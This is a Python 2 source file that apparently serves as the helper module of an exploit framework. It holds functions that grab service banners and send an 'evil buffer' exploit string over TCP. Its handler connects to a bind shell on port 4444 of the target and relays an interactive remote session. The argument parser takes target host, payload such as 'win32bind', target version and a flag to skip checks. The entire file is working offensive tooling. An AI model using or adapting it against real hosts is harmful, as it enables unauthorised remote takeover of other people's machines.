import argparse
import random
import requests
import socket
import string
import subprocess
import os
import sys
import time

def randomstring(length):
    return "".join(random.choice(string.ascii_lowercase) for i in range(length))

def handler( HOST, PAYLOAD ):
    if PAYLOAD == 'win32bind' or PAYLOAD == 'win32prebind':

        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        count = 1
        print "\033[1;32;40m [+] Connecting to our shell!\033[0;37;40m"
        
        while True:
            try:
                # Connect to target host
                client.connect((HOST, 4444))
                print "\033[1;32;40m [+] Got our shell!\033[0;37;40m\n"
                client.settimeout(1)
                data = client.recv(1024)
                sys.stdout.write(data)
                sys.stdout.flush()                
            except socket.error:
                if count == 10:
                    print "\033[1;33;40m [!] Shell is not listening?\033[0;37;40m"
                    exit()
                count = count + 1
                time.sleep(1)
                continue
            break  
        while 1:
            try:
                data = client.recv(1024)
                sys.stdout.write(data)
                sys.stdout.flush()
            except:
                try:
                    client.sendall(raw_input(""))
                    client.sendall("\r\n")    
                except:
                    client.close()
                    print "Socket closed!"
                    exit()

def bannercheck( HOST, PORT ):
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(( HOST, PORT ))
        data = s.recv(1024)
        s.close()
        return data
    except Exception as error:
        print error
        return False

def bannercheckhttp( HOST, PORT ):
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(( HOST, PORT ))
        s.send('GET / HTTP/1.1\r\nHost: %s\r\n\r\n' % HOST)
        data = s.recv(1024)
        s.close()
        return data
    except Exception as error:
        print error
        return False 

def bannercheckhttps( HOST, PORT ):
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(( HOST, PORT ))
        s.send('GET / HTTP/1.1\r\nHost: %s\r\n\r\n' % HOST)
        data = s.recv(1024)
        s.close()
        return data
    except Exception as error:
        print error
        return False 

def tcpexploit( HOST, PORT, SPLOITSTRING ):
    print " Connecting to %s on port %s" % ( HOST, PORT )
    try:
        s=socket.socket( socket.AF_INET, socket.SOCK_STREAM )
        s.connect(( HOST, PORT ))
        s.recv( 1024 )
        print " Sending evil buffer"
        s.send( SPLOITSTRING )
        s.close()
        return True

    except Exception as error:
        print error
        return False

def arguments():
    parser = argparse.ArgumentParser(add_help=True,
            epilog='Example: %s --rhost 192.168.56.101 --target 0 --payload \
            win32bind' % sys.argv[0])
    parser.add_argument('--rhost', dest='RHOST', help='Target IP / Hostname')
    parser.add_argument('--port', dest='PORT', help='Target service port')
    parser.add_argument('--payload', dest='PAYLOAD', help='Shellcode to use')
    parser.add_argument('--args', dest='PARGS', nargs=argparse.REMAINDER)
    parser.add_argument('--force', action='store_true', help='Ignore all checks\
            and send the exploit')
    parser.add_argument('--check', action='store_true', help='Do not exploit\
            vulnerable target')
    parser.add_argument('--targets', action='store_true', help='Print available\
            targets')
    parser.add_argument('--target', dest='TARGET', help='Set the target \
            version')

    return parser
